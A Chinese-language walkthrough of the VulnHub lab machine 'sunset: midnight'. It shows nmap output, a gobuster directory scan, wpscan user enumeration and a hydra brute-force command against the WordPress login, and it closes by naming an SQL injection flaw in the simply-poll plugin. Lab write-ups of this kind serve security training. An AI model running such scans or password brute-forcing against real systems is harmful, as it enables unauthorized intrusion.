# sunset: midnight

2024-5-25 https://www.vulnhub.com/entry/sunset-midnight,517/

difficulty: Intermediate

## IP

192.168.5.30

## Scan

根据靶场提示，将 192.168.5.30 sunset-midnight 添加到 /etc/hosts

Open Port -> 22,80,3306

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 9cfe0b8b8d15e7727e3c23e58655512d (RSA)
|   256 feebef5d40e706679b6367f8d97ed3e2 (ECDSA)
|_  256 3583682c338bb46c2421200d52edcd16 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-title: Did not follow redirect to http://sunset-midnight/
3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
|   Thread ID: 14
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, SupportsCompression, SupportsTransactions, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, ConnectWithDatabase, ODBCClient, SupportsLoadDataLocal, InteractiveClient, Speaks41ProtocolNew, FoundRows, Speaks41ProtocolOld, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: #@Ul?4)mkR9cfZn:uacO
|_  Auth Plugin Name: mysql_native_password
```

直接访问 http://sunset-midnight/ 是个 wordpress，目录扫描看看有什么：

```
gobuster -t 64 dir -u http://sunset-midnight/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e
```

wpscan 枚举下用户：

```
wpscan --url http://sunset-midnight/ -e u

hydra -t 20 -l admin -P ~/tools/dict/rockyou.txt sunset-midnight -f http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.5.30%2Fwordpress%2Fwp-admin%2F&testcookie=1:F=is incorrect"
```

只有一个用户 admin，尝试爆破密码，没找到。

http://sunset-midnight/robots.txt 提示内容：

```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

发现 wordpress 使用了插件 simply-poll-master Version: 1.5，这个插件存在 SQL 注入漏洞，
